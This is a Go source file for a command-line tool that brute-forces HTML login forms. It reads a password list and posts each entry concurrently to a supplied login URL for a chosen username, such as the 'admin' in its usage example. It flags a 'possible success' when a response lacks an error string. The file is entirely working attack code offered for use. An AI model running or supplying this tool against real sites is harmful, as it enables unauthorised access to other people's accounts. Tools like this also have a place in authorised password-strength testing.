// Brute forcing the HTML login form

package main

import (
	"bufio"
	"bytes"
	"fmt"
	"log"
	"net/http"
	"os"
)

func printUsage() {
	fmt.Println(os.Args[0] + ` - Brute force HTTP Login Form
Passwords should be separated by newlines.
URL should include protocol prefix.
You must identify the form's post URL and username and password
field names and pass them as arguments.
Usage:
` + os.Args[0] + ` <pwlistfile> <login_post_url> ` +
		`<username> <username_field> <password_field>
Example:
` + os.Args[0] + ` passwords.txt` +
		` https://test.com/login admin username password
`)
}

func checkArgs() (string, string, string, string, string) {
	if len(os.Args) != 6 {
		log.Println("Incorrect number of arguments.")
		printUsage()
		os.Exit(1)
	}
	// Password list, Post URL, username, username field,
	// password field
	return os.Args[1], os.Args[2], os.Args[3], os.Args[4], os.Args[5]
}

func testLoginForm(url, userField, passField, username, password string, doneChannel chan bool) {
	postData := userField + "=" + username + "&" + passField + "=" + password
	request, err := http.NewRequest("POST", url, bytes.NewBufferString(postData))
	client := &http.Client{}
	response, err := client.Do(request)
	if err != nil {
		log.Println("Error making request. ", err)
	}
	defer response.Body.Close()
	body := make([]byte, 5000) // ~5k buffer for page contents
	response.Body.Read(body)
	if bytes.Contains(body, []byte("ERROR")) {
		log.Println("Error found on website.")
	}
	log.Printf("%s", body)
	if bytes.Contains(body, []byte("ERROR")) || response.StatusCode != 200 {
		// Error on page or in response code
	} else {
		log.Println("Possible success with password: ", password)
		// os.Exit(0) // Exit on success?
	}
	doneChannel <- true
}

func main() {
	pwList, postURL, username, userField, passField := checkArgs()

	// Open password list file
	passwordFile, err := os.Open(pwList)
	if err != nil {
		log.Fatal("Error opening file. ", err)
	}
	defer passwordFile.Close()

	// Default split method is on newline (bufio.ScanLines)
	scanner := bufio.NewScanner(passwordFile)
	doneChannel := make(chan bool)
	numThreads := 0
	maxThreads := 32

	// Check each password against url
	for scanner.Scan() {
		numThreads++
		password := scanner.Text()
		go testLoginForm(
			postURL,
			userField,
			passField,
			username,
			password,
			doneChannel,
		)

		// If max threads reached, wait for one to finish before
		//continuing
		if numThreads >= maxThreads {
			<-doneChannel
			numThreads--
		}
	}

	// Wait for all threads before repeating and fetching a new batch
	for numThreads > 0 {
		<-doneChannel
		numThreads--
	}
}
